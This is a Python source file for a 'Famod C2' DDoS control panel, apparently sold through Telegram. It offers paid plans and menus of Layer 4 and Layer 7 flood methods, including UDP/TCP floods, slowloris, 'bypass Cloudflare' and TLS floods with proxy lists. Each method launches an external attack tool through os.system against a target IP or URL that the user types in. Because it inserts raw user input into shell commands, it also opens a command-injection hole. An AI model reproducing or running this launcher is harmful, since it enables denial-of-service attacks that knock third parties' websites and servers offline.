import socket
import os
import requests
import random
from pystyle import Colors, Colorate, Center

import getpass
import time
from time import sleep
import sys
import threading
import subprocess
import os
import requests,os,time,re,json,uuid,random,sys
from concurrent.futures import ThreadPoolExecutor
import colorama
import threading 
import aiohttp
import asyncio
import multiprocess
import sys
from pystyle import *
import os
import urllib
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

checkhoatdong = requests.get('https://famod-spam.glitch.me/trangthai.txt', verify=False).text
if checkhoatdong != 'open':
    os.system("cls" if os.name == "nt" else "clear")
    print("Server đang bảo trì, hãy thử lại sau")
    time.sleep(2)
    exit()
else:
    time.sleep(2)
    os.system("cls" if os.name == "nt" else "clear")

user = "Admin"
uname = input("Enter Sever Username: ")
os.system("cls" if os.name == "nt" else "clear")
print(f"Welcome {uname} To Famod C2 Fake!!")
print("Please wait...")
os.system("cls" if os.name == "nt" else "clear")
ip = requests.get('https://api.ipify.org').text.strip()
online = random.randint(1, 153)
def si():
    print('       \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233m@nminh23 \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to FAMOD DDoS! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: @nminh23 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mVersion: 4.0')

###My ip####
def mip():
    print(f"""[0mYour IP Is [40;38;2;127;0;255m{ip}[0m""")
###Account###
def account():
    print(f"""[0mID: [38;2;255;0;255mUnknown[0m
[0mUsername: [38;2;255;0;255m{uname}
[0mAdmin: false
[0mReseller: false
[0mVIP: false
[0mBypass Blacklist: true

[0mExpiry: [38;2;255;0;255m30[0m Day(s)
[0mMaxTime: [38;2;255;0;255m99999 [0mSeconds
[0mCooldown: [38;2;255;0;255m0[0m Seconds
[0mConcurrents: [38;2;255;0;255m1[0m
[0mMax Sessions: [38;2;255;0;255m4[0m
[0mMy Attacks Sent: [38;2;255;0;255mUnknow[0m
[0mCurrent IPv4: [38;2;255;0;255m{ip}[0m""")

def help():
    Screen.wrapper(hlp)
    os.system("cls" if os.name == "nt" else "clear")
    si()
    print(f'''
\x1b[38;2;0;255;255m
		╭╮╱╭╮╱╱╭╮╱╱╱╱╭━╮╭━╮
		┃┃╱┃┃╱╱┃┃╱╱╱╱┃┃╰╯┃┃
		┃╰━╯┣━━┫┃╭━━╮┃╭╮╭╮┣━━┳━╮╭╮╭╮
		┃╭━╮┃┃━┫┃┃╭╮┃┃┃┃┃┃┃┃━┫╭╮┫┃┃┃
		┃┃╱┃┃┃━┫╰┫╰╯┃┃┃┃┃┃┃┃━┫┃┃┃╰╯┃
		╰╯╱╰┻━━┻━┫╭━╯╰╯╰╯╰┻━━┻╯╰┻━━╯
		╱╱╱╱╱╱╱╱╱┃┃
		╱╱╱╱╱╱╱╱╱╰╯
                     Welcome to Help Menu Of FAMOD C2!
              ═══╦════════════════════════════════════════╦════
     ╔═══════════╩══════════════════════╗╔════════════════╩═════════════════╗
     ║ Layer4  ---> Method Ddos L4      ║║ Info ---> View Your Plan Details ║
     ║ Methods ---> View Methods Pages  ║║ Clear --> Clear the Terminal     ║
     ╚══════════════════════════════════╝╚══════════════════════════════════╝
            ''')
####Methods###
def l44():
	
	
    
    os.system('cls' if os.name == 'nt' else 'clear')
    si()
    
    print(f'''
                              \x1b[38;2;0;255;255m╔═══════════════╗
                              \x1b[38;2;0;255;255m║    \x1b[38;2;0;255;255mLayer 4    \x1b[38;2;0;255;255m║
               \x1b[38;2;0;255;255m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;255;255m║   \x1b[38;2;0;255;255mudp                 \x1b[38;2;0;255;255m║   \x1b[38;2;0;255;255mtcp               \x1b[38;2;0;255;255m║
               \x1b[38;2;0;255;255m║   \x1b[38;2;0;255;255mnfo-killer          \x1b[38;2;0;255;255m║   \x1b[38;2;0;255;255mstd               \x1b[38;2;0;255;255m║
               \x1b[38;2;0;255;255m║   \x1b[38;2;0;255;255mudpbypass           \x1b[38;2;0;255;255m║   \x1b[38;2;0;255;255mdestroy           \x1b[38;2;0;255;255m║
               \x1b[38;2;0;255;255m║   \x1b[38;2;0;255;255mhome                \x1b[38;2;0;255;255m║   \x1b[38;2;0;255;255mgod               \x1b[38;2;0;255;255m║
               \x1b[38;2;0;255;255m║   \x1b[38;2;0;255;255mslowloris           \x1b[38;2;0;255;255m║   \x1b[38;2;0;255;255mflux              \x1b[38;2;0;255;255m║
               \x1b[38;2;0;255;255m║   \x1b[38;2;0;255;255mstdv2               \x1b[38;2;0;255;255m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;255;255m║
               \x1b[38;2;0;255;255m╚═══════════════════════╩═════════════════════╝
''')
def meth():
    
    os.system('cls' if os.name == 'nt' else 'clear')
    si()
    print(f'''
  
 \x1b[38;2;0;255;255m              🚀 𝓝𝓮𝔀 𝓛𝓪𝔂𝓮𝓻7 𝓦𝓲𝓽𝓱 𝓟𝓸𝔀𝓮𝓻, 𝓔𝓷𝓱𝓪𝓷𝓬𝓮𝓭 𝓐𝓽𝓽𝓪𝓬𝓴𝓼 🚀
         ╔════════════════════════════════════════════════════════════╗
              STATUS           METHODS              DESCRIPTION
           ═══╦═════╦═══   ════╦═════╦════    ════════╦═════╦════════
           ╔══╩═════╩══╗   ╔═══╩═════╩═══╗    ╔═══════╩═════╩═══════╗
           ║  \033[1;33mONLINE  \x1b[38;2;0;255;255m ║   ║  \033[1;31mBYPASS  \x1b[38;2;0;255;255m   ║    ║  \033[1;34mBYPASS CLOUDFLARE  \x1b[38;2;0;255;255m║
          \x1b[38;2;0;255;255m ║  \033[1;33mONLINE  \x1b[38;2;0;255;255m ║   ║  \033[1;31mTLS       \x1b[38;2;0;255;255m ║    ║  \033[1;34mTLS OPTIMIZED      \x1b[38;2;0;255;255m║
          \x1b[38;2;0;255;255m ║  \033[1;33mONLINE  \x1b[38;2;0;255;255m ║   ║  \033[1;31mHTTP-RAW   \x1b[38;2;0;255;255m║    ║  \033[1;34mHIGH REQ & BYPASS  \x1b[38;2;0;255;255m║
           \x1b[38;2;0;255;255m║  \033[1;33mONLINE  \x1b[38;2;0;255;255m ║   ║  \033[1;31mHTTPS      \x1b[38;2;0;255;255m║    ║  \033[1;34mKILLED WEBSITE    \x1b[38;2;0;255;255m ║
         \x1b[38;2;0;255;255m  ╚═══════════╝  \x1b[38;2;0;255;255m ╚═════════════╝    \x1b[38;2;0;255;255m╚═════════════════════╝
           ╔════════════════════════════════════════════════════════╗
           ║         \033[1;34mWelcome to FAMOD C2 Methods Pages.         \x1b[38;2;0;255;255m    ║
           \x1b[38;2;0;255;255m╚════════════════════════════════════════════════════════╝
          \033[1;31m  If you spam attack, you will be banned from FA MOD C2
         ╚════════════════════════════════════════════════════════════╝
''')
def menu():
    
    osystem = sys.platform
ascii = r'''
 ╔═════════════════════════════════════════════════════════════════════════╗
 ║ Welcome To: Famod C2  |  Version: 4.0 ● TELE:[ @nminh23 ]               ║
 ║ Type "help" to see most commands. You also can ask support teams.       ║
 ╠══════════════════════╦══════════════════════════════════════════════════╣
 ║       Updates:       ║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 ║ ~UI Updates.         ║⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣌⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 ║ ~New Methods.        ║⣿⣿⣿⣿⣿⣿⠿⢋⡘⠿⣿⣿⠿⠟⣛⣛⣛⣛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 ║ ~New Themes.         ║⣿⣿⣿⣿⣿⣿⣿⣧⣰⡿⢋⣵⣾⣿⣿⣿⣿⣿⣿⣷⣦⣙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 ║ ~L4 Update Version.  ║⣿⣿⣿⣿⣿⣿⣿⣿⠏⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡉⠉⠭⠉⣙⠛⠿⣿⣿
 ║ ~L7 More Powerfull.  ║⣿⣿⣿⠟⡋⢁⡠⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⢋⡼⢟⣴⠟⣴⣿
 ║                      ║⣯⣿⣡⠎⣴⡏⣾⡀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⣛⡩⠴⢚⡩⠔⣫⣴⣿⣿⣿
 ╠══════════════════════╣⣷⣟⢿⣆⡛⠷⠦⣥⣉⣛⣛⣛⣋⣉⠭⠭⠥⠖⣒⡊⠭⠄⣒⡩⣰⣾⡿⠿⣿⣿⣿⣿
 ║ Thanks For Purchase! ║⣟⣿⣷⣬⣭⣙⣒⣒⣒⠒⣒⣒⣒⣒⣀⣬⣭⣤⣶⣶⣿⣿⠟⣰⣿⣿⣧⣡⣿⣿⣿⣿
 ║  Have A Nice Day !   ║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣬⡛⠿⣿⣿⣿⣿⣿⣿⠿⢛⣡⣾⣿⠏⠹⣿⣿⣿⣿⣿⣿
 ║  C2 Fake Vip Vcl!    ║⣿⣿⣿⣿⣿⣧⣀⣿⣿⣿⣿⣿⣷⣶⣦⣭⣭⣤⣶⣾⣿⣿⣿⣶⡌⢡⣶⣿⣿⣿⣿⣿
 ║  Owner : @nminh23    ║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 ╠══════════════════════╬══════════════════════════════════════════════════╣
 ║  Telegram Channel    ║ ADMIN > [FA MOD]         [You Gay]  > [true]
 ║  t.me/nminh23        ║ PLAN > [VIP]             [EXPIRY]   > [9.99]
 ║  t.me/famodvip23     ║ MAX CONC > [3]           CREATED BY > [nminh]
 ╚══════════════════════╩══════════════════════════════════════════════════╝
'''
banner = """
""".replace('▓', '▀')
banner = Add.Add(ascii, banner, center=True) 
print(Colorate.Horizontal(Colors.red_to_blue, banner))
def cc():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print("""\x1b[38;2;0;255;255m
 ╔═════════════════════════════════════════════════════════════════════════╗
 ║ Welcome To: Famod C2  |  Version: 4.0 ● TELE:[ @nminh23 ]               ║
 ║ Type "help" to see most commands. You also can ask support teams.       ║
 ╠══════════════════════╦══════════════════════════════════════════════════╣
 ║       Updates:       ║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 ║ ~UI Updates.         ║⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣌⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 ║ ~New Methods.        ║⣿⣿⣿⣿⣿⣿⠿⢋⡘⠿⣿⣿⠿⠟⣛⣛⣛⣛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 ║ ~New Themes.         ║⣿⣿⣿⣿⣿⣿⣿⣧⣰⡿⢋⣵⣾⣿⣿⣿⣿⣿⣿⣷⣦⣙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 ║ ~L4 Update Version.  ║⣿⣿⣿⣿⣿⣿⣿⣿⠏⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡉⠉⠭⠉⣙⠛⠿⣿⣿
 ║ ~L7 More Powerfull.  ║⣿⣿⣿⠟⡋⢁⡠⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⢋⡼⢟⣴⠟⣴⣿
 ║                      ║⣯⣿⣡⠎⣴⡏⣾⡀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⣛⡩⠴⢚⡩⠔⣫⣴⣿⣿⣿
 ╠══════════════════════╣⣷⣟⢿⣆⡛⠷⠦⣥⣉⣛⣛⣛⣋⣉⠭⠭⠥⠖⣒⡊⠭⠄⣒⡩⣰⣾⡿⠿⣿⣿⣿⣿
 ║ Thanks For Purchase! ║⣟⣿⣷⣬⣭⣙⣒⣒⣒⠒⣒⣒⣒⣒⣀⣬⣭⣤⣶⣶⣿⣿⠟⣰⣿⣿⣧⣡⣿⣿⣿⣿
 ║  Have A Nice Day !   ║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣬⡛⠿⣿⣿⣿⣿⣿⣿⠿⢛⣡⣾⣿⠏⠹⣿⣿⣿⣿⣿⣿
 ║  C2 Fake Vip Vcl!    ║⣿⣿⣿⣿⣿⣧⣀⣿⣿⣿⣿⣿⣷⣶⣦⣭⣭⣤⣶⣾⣿⣿⣿⣶⡌⢡⣶⣿⣿⣿⣿⣿
 ║  Owner : @nminh23    ║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 ╠══════════════════════╬══════════════════════════════════════════════════╣
 ║  Telegram Channel    ║ ADMIN > [FA MOD]         [You Gay]  > [true]
 ║  t.me/nminh23        ║ PLAN > [VIP]             [EXPIRY]   > [9.99]
 ║  t.me/famodvip23     ║ MAX CONC > [3]           CREATED BY > [nminh]
 ╚══════════════════════╩══════════════════════════════════════════════════╝
""")
def main():
    menu()
    while(True):
        cnc = input(f"\033[0;30;45m{uname} ● Famod\x1b[1;37m\033[0m ➤➤\x1b[1;37m\033[0m")
        if cnc == "METHODS" or cnc == "methods" or cnc == "method":
            meth()
        elif cnc == "CLEAR" or cnc == "clear" or cnc == "cls":
            cc()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "Layer4":
            l44()
        elif cnc == "info" or cnc == "INFO" or cnc == "account":
            account()
        elif cnc == "HELP" or cnc == "Help" or cnc == "help":
            help()
        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./UDPBYPASS {ip} {port}')
            except IndexError:
                print('Usage: udpbypass <ip> <port>')
                print('Example: udpbypass 1.1.1.1 80')

        elif "stdv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./std {ip} {port}')
            except IndexError:
                print('Usage: stdv2 <ip> <port>')
                print('Example: stdv2 1.1.1.1 80')

        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./flux {ip} {port} {thread} 0')
            except IndexError:
                print('Usage: flux <ip> <port> <threads>')
                print('Example: flux 1.1.1.1 80 250')

        elif "slowloris" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./slowloris {ip} {port}')
            except IndexError:
                print('Usage: slowloris <ip> <port>')
                print('Example: slowloris 1.1.1.1 80')

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                times = cnc.split()[3]
                os.system(f'perl god.pl {ip} {port} 65500 {times}')
            except IndexError:
                print('Usage: god <ip> <port> <time>')
                print('Example: god 1.1.1.1 80 60')

        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                times = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 65500 {times}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')

        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./STD-NOSPOOF {ip} {port}')
            except IndexError:
                print('Usage: std <ip> <port>')
                print('Example: std 1.1.1.1 80')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                times = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {times}')
            except IndexError:
                print('Usage: home <ip> <port> <packet_size> <time>')
                print('Example: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                times = cnc.split()[4]
                os.system(f'./nfo-killer {ip} {port} {threads} -1 {times}')
            except IndexError:
                print('Usage: nfo-killer <ip> <port> <threads> <time>')
                print('Example: nfo-killer 1.1.1.1 80 850 60')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                times = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {times} {conns}')
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                times = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {times} {conns}')
            except IndexError:
                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')

# SPECIAL METHODS

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                times = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {times} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
        elif "http-raw" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                times=cnc.split()[3]
                
                print("\033[1;38;2;204;0;102mAttack Has Been Successfully Sent""")
                time.sleep(1)
                print(f"""𝐅𝐀𝐌𝐎𝐃""")
                time.sleep(1)
                print(f"""Method Use: [http-raw]""")
                time.sleep(1)
                print(f"""Target: [{url}] """)
                time.sleep(1)
                print(f"""Port: [{port}] """)
                time.sleep(1)
                print(f"""Duration: [{times}] """)
                time.sleep(1)
                print(f"""Sent By: [{uname}] """)
                os.system(f"node rand {url} {times}")
            except IndexError:
                print("Usage : http-raw <url> <port> <time>")
                print("Example : http-raw https://nm2302.site/ 443 60")
        elif "tls" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]                
                times=cnc.split()[3]
                
                
                print("\033[1;38;2;204;0;102mAttack Has Been Successfully Sent""")
                time.sleep(1)
                print(f"""𝐅𝐀𝐌𝐎𝐃""")
                time.sleep(1)
                print(f"""Method Use: [tls]""")
                time.sleep(1)
                print(f"""Target: [{url}] """)
                time.sleep(1)
                print(f"""Port: [{port}] """)
                time.sleep(1)
                print(f"""Duration: [{times}] """)
                time.sleep(1)
                print(f"""Sent By: [{uname}] """)
                os.system(f"node tls.js {url} {times} 30 35 proxy.txt")
            except IndexError:
                print("Usage : tls-mix <url> <port> <time>")
                print("Example : tls https://nm2302.site/ 443 60")
        elif "bypass" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                times=cnc.split()[3]
                
                
                print("\033[1;38;2;204;0;102mAttack Has Been Successfully Sent""")
                time.sleep(1)
                print(f"""𝐅𝐀𝐌𝐎𝐃""")
                time.sleep(1)
                print(f"""Method Use: [bypass]""")
                time.sleep(1)
                print(f"""Target: [{url}] """)
                time.sleep(1)
                print(f"""Port: [{port}] """)
                time.sleep(1)
                print(f"""Duration: [{times}] """)
                time.sleep(1)
                print(f"""Sent By: [{uname}] """)
                os.system(f"node bypass {url} {times} 30 35 proxy.txt")
            except IndexError:
                print("Usage : bypass <url> <port> <time>")
                print("Example : bypass https://nm2302.site/ 443 60")
        elif "https" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                times=cnc.split()[3]
                
                
                print("\033[1;38;2;204;0;102mAttack Has Been Successfully Sent""")
                time.sleep(1)
                print(f"""𝐅𝐀𝐌𝐎𝐃""")
                time.sleep(1)
                print(f"""Method Use: [https]""")
                time.sleep(1)
                print(f"""Target: [{url}] """)
                time.sleep(1)
                print(f"""Port: [{port}] """)
                time.sleep(1)
                print(f"""Duration: [{times}] """)
                time.sleep(1)
                print(f"""Sent By: [{uname}] """)
                os.system(f"node https {url} {times} 30 35 proxy.txt")
            except IndexError:
                print("Usage : https <url> <port> <time>")
                print("Example : http-flood https://nm2302.site/ 443 60")
        else:
            try:
                cmd=cnc.split()[0]
                print("=>> "+cmd+" Not Found!!")
            except IndexError:
                pass
            

main()